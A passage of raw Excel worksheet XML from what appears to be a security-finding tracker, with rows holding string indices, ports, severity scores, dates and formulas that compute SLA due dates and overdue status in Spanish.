      <c r="N256" s="5"/>
      <c r="O256" s="14"/>
      <c r="P256" s="10"/>
      <c r="Q256" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R256" s="4">
        <v>443</v>
      </c>
      <c r="S256" s="22"/>
      <c r="T256" s="8">
        <v>45168</v>
      </c>
      <c r="U256" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1041</v>
      </c>
      <c r="V256" s="8" t="str">
        <f t="shared" si="10"/>
        <v/>
      </c>
      <c r="W256" s="12" t="str">
        <f t="shared" si="11"/>
        <v>Error</v>
      </c>
      <c r="X256" s="12"/>
      <c r="Y256" s="11"/>
      <c r="Z256" s="11"/>
      <c r="AA256" s="8"/>
      <c r="AB256" s="32" t="s">
        <v>1049</v>
      </c>
      <c r="AC256" s="32" t="s">
        <v>1050</v>
      </c>
      <c r="AD256" s="9"/>
      <c r="AE256" s="27" t="s">
        <v>1051</v>
      </c>
      <c r="AF256" s="27"/>
      <c r="AG256" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH256" t="str">
        <f>IFERROR(VLOOKUP(H256,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="257" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A257" s="5">
        <v>256</v>
      </c>
      <c r="B257" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C257" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D257" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E257" s="4"/>
      <c r="F257" s="4"/>
      <c r="G257" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H257" s="4"/>
      <c r="I257" s="4"/>
      <c r="J257" s="4" t="s">
        <v>1052</v>
      </c>
      <c r="K257" s="6"/>
      <c r="L257" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M257" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N257" s="5"/>
      <c r="O257" s="14"/>
      <c r="P257" s="10"/>
      <c r="Q257" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R257" s="4">
        <v>443</v>
      </c>
      <c r="S257" s="22"/>
      <c r="T257" s="8">
        <v>45221</v>
      </c>
      <c r="U257" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>988</v>
      </c>
      <c r="V257" s="8">
        <f t="shared" si="10"/>
        <v>45341</v>
      </c>
      <c r="W257" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X257" s="12"/>
      <c r="Y257" s="11"/>
      <c r="Z257" s="11"/>
      <c r="AA257" s="8"/>
      <c r="AB257" s="32" t="s">
        <v>1053</v>
      </c>
      <c r="AC257" s="32" t="s">
        <v>1054</v>
      </c>
      <c r="AD257" s="9"/>
      <c r="AE257" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF257" s="27"/>
      <c r="AG257" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH257" t="str">
        <f>IFERROR(VLOOKUP(H257,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="258" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A258" s="5">
        <v>257</v>
      </c>
      <c r="B258" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C258" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D258" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E258" s="4"/>
      <c r="F258" s="4"/>
      <c r="G258" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H258" s="4"/>
      <c r="I258" s="4"/>
      <c r="J258" s="4" t="s">
        <v>1056</v>
      </c>
      <c r="K258" s="6"/>
      <c r="L258" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M258" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N258" s="5"/>
      <c r="O258" s="14"/>
      <c r="P258" s="10"/>
      <c r="Q258" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R258" s="4">
        <v>443</v>
      </c>
      <c r="S258" s="22"/>
      <c r="T258" s="8">
        <v>45168</v>
      </c>
      <c r="U258" s="11">
        <f t="shared" ref="U258:U321" ca="1" si="12">TODAY()-T258</f>
        <v>1041</v>
      </c>
      <c r="V258" s="8">
        <f t="shared" ref="V258:V321" si="13">IF(M258="Critical",T258+10,IF(M258="High",T258+30,IF(M258="Bad",T258+30,IF(M258="Medium",T258+90,IF(M258="Warm",T258+90,IF(M258="Low",T258+120,IF(M258="Fair",T258+120,IF(M258="Neutral",T258+120,""))))))))</f>
        <v>45288</v>
      </c>
      <c r="W258" s="12" t="str">
        <f t="shared" ref="W258:W321" ca="1" si="14">IF(M258="Critical",IF(U258&gt;10,"SLA Vencido","En SLA"),IF(M258="High",IF(U258&gt;30,"SLA Vencido","En SLA"),IF(M258="Bad",IF(U258&gt;30,"SLA Vencido","En SLA"),IF(M258="Medium",IF(U258&gt;90,"SLA Vencido","En SLA"),IF(M258="Warm",IF(U258&gt;90,"SLA Vencido","En SLA"),IF(M258="Low",IF(U258&gt;120,"SLA Vencido","En SLA"),IF(M258="Fair",IF(U258&gt;120,"SLA Vencido","En SLA"),IF(M258="Neutral",IF(U258&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X258" s="12"/>
      <c r="Y258" s="11"/>
      <c r="Z258" s="11"/>
      <c r="AA258" s="8"/>
      <c r="AB258" s="32" t="s">
        <v>1057</v>
      </c>
      <c r="AC258" s="32" t="s">
        <v>1058</v>
      </c>
      <c r="AD258" s="9"/>
      <c r="AE258" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF258" s="27"/>
      <c r="AG258" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH258" t="str">
        <f>IFERROR(VLOOKUP(H258,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="259" spans="1:34" ht="330.75" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A259" s="5">
        <v>258</v>
      </c>
      <c r="B259" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C259" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D259" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E259" s="4"/>
      <c r="F259" s="4"/>
      <c r="G259" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H259" s="4"/>
      <c r="I259" s="4"/>
      <c r="J259" s="4" t="s">
        <v>1059</v>
      </c>
      <c r="K259" s="6"/>
      <c r="L259" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M259" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N259" s="5"/>
      <c r="O259" s="14"/>
      <c r="P259" s="10"/>
      <c r="Q259" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R259" s="4">
        <v>443</v>
      </c>
      <c r="S259" s="22"/>
      <c r="T259" s="8">
        <v>44971</v>
      </c>
      <c r="U259" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>1238</v>
      </c>
      <c r="V259" s="8">
        <f t="shared" si="13"/>
        <v>45091</v>
      </c>
      <c r="W259" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X259" s="12"/>
      <c r="Y259" s="11"/>
      <c r="Z259" s="11"/>
      <c r="AA259" s="8"/>
      <c r="AB259" s="32" t="s">
        <v>1060</v>
      </c>
      <c r="AC259" s="32" t="s">
        <v>1061</v>
      </c>
      <c r="AD259" s="9"/>
      <c r="AE259" s="27" t="s">
        <v>1055</v>
      </c>
      <c r="AF259" s="27"/>
      <c r="AG259" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH259" t="str">
        <f>IFERROR(VLOOKUP(H259,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="260" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A260" s="5">
        <v>259</v>
      </c>
      <c r="B260" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C260" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D260" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E260" s="4"/>
      <c r="F260" s="4"/>
      <c r="G260" s="6" t="s">
        <v>1062</v>
      </c>
      <c r="H260" s="4"/>
      <c r="I260" s="4"/>
      <c r="J260" s="4" t="s">
        <v>1063</v>
      </c>
      <c r="K260" s="6"/>
      <c r="L260" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M260" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N260" s="5"/>
      <c r="O260" s="14"/>
      <c r="P260" s="10" t="s">
        <v>1064</v>
      </c>
      <c r="Q260" s="6"/>
      <c r="R260" s="4">
        <v>53</v>
      </c>
      <c r="S260" s="22"/>
      <c r="T260" s="8">
        <v>45398</v>
      </c>
      <c r="U260" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>811</v>
      </c>
      <c r="V260" s="8">
        <f t="shared" si="13"/>
        <v>45488</v>
      </c>
      <c r="W260" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X260" s="12"/>
      <c r="Y260" s="11"/>
      <c r="Z260" s="11"/>
      <c r="AA260" s="8" t="s">
        <v>1065</v>
      </c>
      <c r="AB260" s="32" t="s">
        <v>1066</v>
      </c>
      <c r="AC260" s="32" t="s">
        <v>1067</v>
      </c>
      <c r="AD260" s="9"/>
      <c r="AE260" s="8"/>
      <c r="AF260" s="27"/>
      <c r="AG260" s="27" t="s">
        <v>594</v>
      </c>
      <c r="AH260" t="str">
        <f>IFERROR(VLOOKUP(H260,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="261" spans="1:34" ht="120" hidden="1" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A261" s="5">
        <v>260</v>
      </c>
      <c r="B261" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C261" s="5" t="s">
        <v>1068</v>
      </c>
      <c r="D261" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E261" s="4"/>
      <c r="F261" s="4"/>
      <c r="G261" s="6" t="s">
        <v>1069</v>
      </c>
      <c r="H261" s="4" t="s">
        <v>1070</v>
      </c>
      <c r="I261" s="4"/>
      <c r="J261" s="4" t="s">
        <v>1071</v>
      </c>
      <c r="K261" s="6"/>
      <c r="L261" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M261" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N261" s="5"/>
      <c r="O261" s="14"/>
      <c r="P261" s="10"/>
      <c r="Q261" s="6" t="s">
        <v>1072</v>
      </c>
      <c r="R261" s="4"/>
      <c r="S261" s="22"/>
      <c r="T261" s="8">
        <v>45401</v>
      </c>
      <c r="U261" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>808</v>
      </c>
      <c r="V261" s="8">
        <f t="shared" si="13"/>
        <v>45431</v>
      </c>
      <c r="W261" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X261" s="12"/>
      <c r="Y261" s="11"/>
      <c r="Z261" s="11"/>
      <c r="AA261" s="8">
        <v>45517</v>
      </c>
      <c r="AB261" s="32" t="s">
        <v>1073</v>
      </c>
      <c r="AC261" s="32" t="s">
        <v>1074</v>
      </c>
      <c r="AD261" s="9"/>
      <c r="AE261" s="8"/>
      <c r="AF261" s="27" t="s">
        <v>1075</v>
      </c>
      <c r="AG261" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH261" t="str">
        <f>IFERROR(VLOOKUP(H261,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="262" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A262" s="5">
        <v>261</v>
      </c>
      <c r="B262" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C262" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D262" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E262" s="4"/>
      <c r="F262" s="4"/>
      <c r="G262" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H262" s="4"/>
      <c r="I262" s="4"/>
      <c r="J262" s="4" t="s">
        <v>1076</v>
      </c>
      <c r="K262" s="6"/>
      <c r="L262" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M262" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N262" s="5"/>
      <c r="O262" s="14"/>
      <c r="P262" s="10"/>
      <c r="Q262" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R262" s="4"/>
      <c r="S262" s="22"/>
      <c r="T262" s="8">
        <v>45404</v>
      </c>
      <c r="U262" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>805</v>
      </c>
      <c r="V262" s="8">
        <f t="shared" si="13"/>
        <v>45524</v>
      </c>
      <c r="W262" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X262" s="12"/>
      <c r="Y262" s="11"/>
      <c r="Z262" s="11"/>
      <c r="AA262" s="8">
        <v>45686</v>
      </c>
      <c r="AB262" s="32" t="s">
        <v>1077</v>
      </c>
      <c r="AC262" s="39" t="s">
        <v>1078</v>
      </c>
      <c r="AD262" s="9" t="s">
        <v>1079</v>
      </c>
      <c r="AE262" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF262" s="27"/>
      <c r="AG262" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH262" t="str">
        <f>IFERROR(VLOOKUP(H262,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="263" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A263" s="5">
        <v>262</v>
      </c>
      <c r="B263" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C263" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D263" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E263" s="4"/>
      <c r="F263" s="4"/>
      <c r="G263" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H263" s="4"/>
      <c r="I263" s="4"/>
      <c r="J263" s="4" t="s">
        <v>1080</v>
      </c>
      <c r="K263" s="6"/>
      <c r="L263" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M263" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N263" s="5"/>
      <c r="O263" s="14"/>
      <c r="P263" s="10"/>
      <c r="Q263" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R263" s="4"/>
      <c r="S263" s="22"/>
      <c r="T263" s="8">
        <v>45404</v>
      </c>
      <c r="U263" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>805</v>
      </c>
      <c r="V263" s="8">
        <f t="shared" si="13"/>
        <v>45524</v>
      </c>
      <c r="W263" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X263" s="12"/>
      <c r="Y263" s="11"/>
      <c r="Z263" s="11"/>
      <c r="AA263" s="8">
        <v>45686</v>
      </c>
      <c r="AB263" s="32" t="s">
        <v>1081</v>
      </c>
      <c r="AC263" s="39" t="s">
        <v>1082</v>
      </c>
      <c r="AD263" s="9" t="s">
        <v>1083</v>
      </c>
      <c r="AE263" s="27" t="s">
        <v>792</v>
      </c>
      <c r="AF263" s="27"/>
      <c r="AG263" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH263" t="str">
        <f>IFERROR(VLOOKUP(H263,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="264" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A264" s="5">
        <v>263</v>
      </c>
      <c r="B264" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C264" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D264" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E264" s="4"/>
      <c r="F264" s="4"/>
      <c r="G264" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H264" s="4" t="s">
        <v>1085</v>
      </c>
      <c r="I264" s="4"/>
      <c r="J264" s="4" t="s">
        <v>1086</v>
      </c>
      <c r="K264" s="6"/>
      <c r="L264" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M264" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N264" s="5">
        <v>5.3</v>
      </c>
      <c r="O264" s="14"/>
      <c r="P264" s="10"/>
      <c r="Q264" s="6" t="s">
        <v>1087</v>
      </c>
      <c r="R264" s="4"/>
      <c r="S264" s="22"/>
      <c r="T264" s="8">
        <v>45408</v>
      </c>
      <c r="U264" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>801</v>
      </c>
      <c r="V264" s="8">
        <f t="shared" si="13"/>
        <v>45498</v>
      </c>
      <c r="W264" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X264" s="12"/>
      <c r="Y264" s="11"/>
      <c r="Z264" s="11"/>
      <c r="AA264" s="8">
        <v>45408</v>
      </c>
      <c r="AB264" s="32" t="s">
        <v>1088</v>
      </c>
      <c r="AC264" s="39" t="s">
        <v>1089</v>
      </c>
      <c r="AD264" s="9" t="s">
        <v>1090</v>
      </c>
      <c r="AE264" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF264" s="27" t="s">
        <v>1091</v>
      </c>
      <c r="AG264" s="27" t="s">
        <v>1092</v>
      </c>
      <c r="AH264" t="str">
        <f>IFERROR(VLOOKUP(H264,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="265" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A265" s="5">
        <v>264</v>
      </c>
      <c r="B265" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C265" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D265" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E265" s="4"/>
      <c r="F265" s="4"/>
      <c r="G265" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H265" s="4" t="s">
        <v>1093</v>
      </c>
      <c r="I265" s="4" t="s">
        <v>1094</v>
      </c>
      <c r="J265" s="4" t="s">
        <v>1095</v>
      </c>
      <c r="K265" s="4"/>
      <c r="L265" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M265" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N265" s="5">
        <v>10</v>
      </c>
      <c r="O265" s="6"/>
      <c r="P265" s="6"/>
      <c r="Q265" s="6" t="s">
        <v>1096</v>
      </c>
      <c r="R265" s="4"/>
      <c r="S265" s="22"/>
      <c r="T265" s="8">
        <v>45436</v>
      </c>
      <c r="U265" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>773</v>
      </c>
      <c r="V265" s="8">
        <f t="shared" si="13"/>
        <v>45446</v>
      </c>
      <c r="W265" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X265" s="11"/>
      <c r="Y265" s="11"/>
      <c r="Z265" s="11"/>
      <c r="AA265" s="8">
        <v>45436</v>
      </c>
      <c r="AB265" s="9" t="s">
        <v>1097</v>
      </c>
      <c r="AC265" s="32" t="s">
        <v>1098</v>
      </c>
      <c r="AD265" s="32" t="s">
        <v>1099</v>
      </c>
      <c r="AE265" s="27"/>
      <c r="AF265" s="9"/>
      <c r="AG265" s="27" t="s">
        <v>1092</v>
      </c>
      <c r="AH265" t="str">
        <f>IFERROR(VLOOKUP(H265,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="266" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A266" s="5">
        <v>265</v>
      </c>
      <c r="B266" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C266" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D266" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E266" s="4"/>
      <c r="F266" s="4"/>
      <c r="G266" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H266" s="4" t="s">
        <v>1100</v>
      </c>
      <c r="I266" s="4" t="s">
        <v>1101</v>
      </c>
      <c r="J266" s="4" t="s">
        <v>1102</v>
      </c>
      <c r="K266" s="4"/>
      <c r="L266" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M266" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N266" s="5">
        <v>6.8</v>
      </c>
      <c r="O266" s="6"/>
      <c r="P266" s="6"/>
      <c r="Q266" s="6" t="s">
        <v>143</v>
      </c>
      <c r="R266" s="4"/>
      <c r="S266" s="22"/>
      <c r="T266" s="8">
        <v>45425</v>
      </c>
      <c r="U266" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>784</v>
      </c>
      <c r="V266" s="8">
        <f t="shared" si="13"/>
        <v>45515</v>
      </c>
      <c r="W266" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X266" s="11"/>
      <c r="Y266" s="11"/>
      <c r="Z266" s="11"/>
      <c r="AA266" s="8"/>
      <c r="AB266" s="9" t="s">
        <v>1103</v>
      </c>
      <c r="AC266" s="32" t="s">
        <v>1104</v>
      </c>
      <c r="AD266" s="32" t="s">
        <v>1105</v>
      </c>
      <c r="AE266" s="27" t="s">
        <v>1106</v>
      </c>
      <c r="AF266" s="9"/>
      <c r="AG266" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH266" t="str">
        <f>IFERROR(VLOOKUP(H266,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="267" spans="1:34" ht="261" hidden="1" x14ac:dyDescent="0.35">
      <c r="A267" s="5">
        <v>266</v>
      </c>
      <c r="B267" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C267" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D267" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E267" s="4"/>
      <c r="F267" s="4"/>
      <c r="G267" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H267" s="4" t="s">
        <v>1107</v>
      </c>
      <c r="I267" s="4" t="s">
        <v>1108</v>
      </c>
      <c r="J267" s="4" t="s">
        <v>1109</v>
      </c>
      <c r="K267" s="4"/>
      <c r="L267" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M267" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N267" s="5">
        <v>7.1</v>
      </c>
      <c r="O267" s="6"/>
      <c r="P267" s="6"/>
      <c r="Q267" s="6" t="s">
        <v>1096</v>
      </c>
      <c r="R267" s="4"/>
      <c r="S267" s="22"/>
      <c r="T267" s="8">
        <v>45436</v>
      </c>
      <c r="U267" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>773</v>
      </c>
      <c r="V267" s="8">
        <f t="shared" si="13"/>
        <v>45466</v>
      </c>
      <c r="W267" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X267" s="11"/>
      <c r="Y267" s="11"/>
      <c r="Z267" s="11"/>
      <c r="AA267" s="8">
        <v>45436</v>
      </c>
      <c r="AB267" s="9" t="s">
        <v>1110</v>
      </c>
      <c r="AC267" s="32" t="s">
        <v>1111</v>
      </c>
      <c r="AD267" s="32" t="s">
        <v>1112</v>
      </c>
      <c r="AE267" s="27"/>
      <c r="AF267" s="9"/>
      <c r="AG267" s="27" t="s">
        <v>1092</v>
      </c>
      <c r="AH267" t="str">
        <f>IFERROR(VLOOKUP(H267,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="268" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A268" s="5">
        <v>267</v>
      </c>
      <c r="B268" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C268" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D268" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E268" s="4"/>
      <c r="F268" s="4"/>
      <c r="G268" s="6" t="s">
        <v>755</v>
      </c>
      <c r="H268" s="9" t="s">
        <v>1113</v>
      </c>
      <c r="I268" s="4" t="s">
        <v>1114</v>
      </c>
      <c r="J268" s="4" t="s">
        <v>1115</v>
      </c>
      <c r="K268" s="4"/>
      <c r="L268" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M268" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N268" s="5">
        <v>3</v>
      </c>
      <c r="O268" s="6"/>
      <c r="P268" s="6"/>
      <c r="Q268" s="6" t="s">
        <v>759</v>
      </c>
      <c r="R268" s="4"/>
      <c r="S268" s="22"/>
      <c r="T268" s="8">
        <v>45439</v>
      </c>
      <c r="U268" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>770</v>
      </c>
      <c r="V268" s="8">
        <f t="shared" si="13"/>
        <v>45559</v>
      </c>
      <c r="W268" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X268" s="11"/>
      <c r="Y268" s="11"/>
      <c r="Z268" s="11"/>
      <c r="AA268" s="8"/>
      <c r="AB268" s="9" t="s">
        <v>1116</v>
      </c>
      <c r="AC268" s="32" t="s">
        <v>1117</v>
      </c>
      <c r="AD268" s="32" t="s">
        <v>1118</v>
      </c>
      <c r="AE268" s="8" t="s">
        <v>763</v>
      </c>
      <c r="AF268" s="6" t="s">
        <v>935</v>
      </c>
      <c r="AG268" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH268" t="str">
        <f>IFERROR(VLOOKUP(H268,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="269" spans="1:34" ht="348" hidden="1" x14ac:dyDescent="0.35">
      <c r="A269" s="5">
        <v>268</v>
      </c>
      <c r="B269" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C269" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D269" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E269" s="4"/>
      <c r="F269" s="4"/>
      <c r="G269" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H269" s="9" t="s">
        <v>1119</v>
      </c>
      <c r="I269" s="4" t="s">
        <v>1120</v>
      </c>
      <c r="J269" s="4" t="s">
        <v>1121</v>
      </c>
      <c r="K269" s="4"/>
      <c r="L269" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M269" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N269" s="5">
        <v>8.9</v>
      </c>
      <c r="O269" s="6"/>
      <c r="P269" s="6"/>
      <c r="Q269" s="6" t="s">
        <v>1096</v>
      </c>
      <c r="R269" s="4"/>
      <c r="S269" s="22"/>
      <c r="T269" s="8">
        <v>45436</v>
      </c>
      <c r="U269" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>773</v>
      </c>
      <c r="V269" s="8">
        <f t="shared" si="13"/>
        <v>45466</v>
      </c>
      <c r="W269" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X269" s="11"/>
      <c r="Y269" s="11"/>
      <c r="Z269" s="11"/>
      <c r="AA269" s="8">
        <v>45436</v>
      </c>
      <c r="AB269" s="9" t="s">
        <v>1122</v>
      </c>
      <c r="AC269" s="32" t="s">
        <v>1123</v>
      </c>
      <c r="AD269" s="32" t="s">
        <v>1124</v>
      </c>
      <c r="AE269" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF269" s="9"/>
      <c r="AG269" s="27" t="s">
        <v>1092</v>
      </c>
      <c r="AH269" t="str">
        <f>IFERROR(VLOOKUP(H269,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="270" spans="1:34" ht="232" hidden="1" x14ac:dyDescent="0.35">
      <c r="A270" s="5">
        <v>269</v>
      </c>
      <c r="B270" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C270" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D270" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E270" s="4"/>
      <c r="F270" s="4"/>
      <c r="G270" s="6" t="s">
        <v>1084</v>
      </c>
      <c r="H270" s="4" t="s">
        <v>1125</v>
      </c>
      <c r="I270" s="4" t="s">
        <v>1126</v>
      </c>
      <c r="J270" s="4" t="s">
        <v>795</v>
      </c>
      <c r="K270" s="4"/>
      <c r="L270" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M270" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N270" s="5">
        <v>3.1</v>
      </c>
      <c r="O270" s="6"/>
      <c r="P270" s="6"/>
      <c r="Q270" s="6" t="s">
        <v>1127</v>
      </c>
      <c r="R270" s="4"/>
      <c r="S270" s="22"/>
      <c r="T270" s="8">
        <v>45436</v>
      </c>
      <c r="U270" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>773</v>
      </c>
      <c r="V270" s="8">
        <f t="shared" si="13"/>
        <v>45556</v>
      </c>
      <c r="W270" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X270" s="11"/>
      <c r="Y270" s="11"/>
      <c r="Z270" s="11"/>
      <c r="AA270" s="8"/>
      <c r="AB270" s="9" t="s">
        <v>1128</v>
      </c>
      <c r="AC270" s="32" t="s">
        <v>797</v>
      </c>
      <c r="AD270" s="32" t="s">
        <v>1129</v>
      </c>
      <c r="AE270" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF270" s="9"/>
      <c r="AG270" s="27" t="s">
        <v>1092</v>
      </c>
      <c r="AH270" t="str">
        <f>IFERROR(VLOOKUP(H270,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="271" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
